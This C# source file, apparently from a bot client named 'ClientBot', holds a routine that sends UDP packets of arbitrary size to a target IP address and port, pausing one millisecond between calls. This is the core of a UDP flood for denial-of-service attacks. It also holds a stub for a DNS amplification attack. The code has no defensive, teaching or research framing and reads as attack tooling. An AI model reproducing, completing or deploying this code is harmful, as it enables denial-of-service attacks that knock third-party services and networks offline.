using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientBot
{
    class SEND
    {
        public static bool sendData(IPAddress ipAddr,int port,int byteAmount,string text)
        {
            try
            {
                byte[] textByte = Encoding.ASCII.GetBytes(text);
                new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(new byte[byteAmount], new IPEndPoint(ipAddr, port));
                Thread.Sleep(1);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        public static bool dnsAmplifcation()
        {
          //  Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
            return false;
        }
    }
}
